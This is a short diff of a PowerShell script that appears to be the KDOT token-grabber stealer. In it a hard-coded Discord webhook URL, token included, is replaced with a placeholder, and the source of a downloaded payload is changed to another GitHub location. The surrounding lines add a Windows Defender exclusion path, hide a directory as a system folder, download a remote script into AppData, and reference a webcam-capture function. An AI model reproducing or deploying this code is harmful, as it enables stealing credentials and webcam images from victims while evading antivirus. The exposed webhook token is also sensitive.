@@ -751,7 +751,7 @@ function Get-WebCamImage {
         }
 }
 
-$webhook = "https://discordapp.com/api/webhooks/1113701980318216282/bJgWo91QcXmy0kgidv5maYAAoAYk6sKGMJyepVYRMElpJCXHy5VEicduvYTVZjyLXgFj"
+$webhook = "YOUR_WEBHOOK_HERE"
 
 function Invoke-TASKS {
     Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" | Out-Null
@@ -762,7 +762,7 @@ function Invoke-TASKS {
     $KDOT_DIR = Get-Item "$env:APPDATA\KDOT" -Force
     $KDOT_DIR.Attributes = "Hidden","System"
 
-    (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main.ps1", "$env:APPDATA\KDOT\KDOT.ps1") | Out-Null
+    (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/masterc123/Testing/main/s/powershell123.ps1", "$env:APPDATA\KDOT\KDOT.ps1") | Out-Null
 
     $inputstuff = Get-Content "$env:APPDATA\KDOT\KDOT.ps1"
 
